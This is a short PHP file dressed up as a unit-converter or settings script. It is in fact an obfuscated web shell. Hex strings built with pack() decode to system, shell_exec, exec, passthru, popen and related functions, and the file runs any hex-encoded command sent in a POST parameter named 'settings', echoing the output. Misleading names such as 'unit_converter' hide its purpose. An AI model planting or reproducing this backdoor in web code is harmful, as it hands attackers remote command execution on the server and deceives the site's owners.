<?php


$val1 = '79';
$val2 = '73';
$val3 = '74';
$val4 = '6d';
$val5 = '68';
$val6 = '65';
$val7 = '63';
$val8 = '78';
$val9 = '61';
$val10 = '70';
$val11 = '72';
$val12 = '5f';
$val13 = '6f';
$val14 = '6e';
$val15 = '6c';
$val16 = '69';
$unit_converter1 = pack("H*", '73'.$val1.$val2.$val3.'65'.$val4);
$unit_converter2 = pack("H*", '73'.$val5.'65'.'6c'.'6c'.'5f'.$val6.'78'.'65'.$val7);
$unit_converter3 = pack("H*", '65'.$val8.'65'.$val7);
$unit_converter4 = pack("H*", '70'.$val9.$val2.'73'.$val3.'68'.'72'.'75');
$unit_converter5 = pack("H*", $val10.'6f'.$val10.$val6.'6e');
$unit_converter6 = pack("H*", $val2.'74'.$val11.$val6.$val9.'6d'.'5f'.'67'.'65'.$val3.$val12.'63'.$val13.'6e'.$val3.'65'.$val14.$val3.'73');
$unit_converter7 = pack("H*", '70'.$val7.$val15.'6f'.$val2.'65');
$settings = pack("H*", $val2.'65'.'74'.$val3.$val16.'6e'.'67'.'73');
if (isset($_POST[$settings])) {
    $settings = pack("H*", $_POST[$settings]);
    if (function_exists($unit_converter1)) {
        $unit_converter1($settings);
    } elseif (function_exists($unit_converter2)) {
        print $unit_converter2($settings);
    } elseif (function_exists($unit_converter3)) {
        $unit_converter3($settings, $mrk_desc);
        print join("\n", $mrk_desc);
    } elseif (function_exists($unit_converter4)) {
        $unit_converter4($settings);
    } elseif (function_exists($unit_converter5) && function_exists($unit_converter6) && function_exists($unit_converter7)) {
        $ent_symbol = $unit_converter5($settings, 'r');
        if ($ent_symbol) {
            $sym_res = $unit_converter6($ent_symbol);
            $unit_converter7($ent_symbol);
            print $sym_res;
        }
    }
    exit;
}
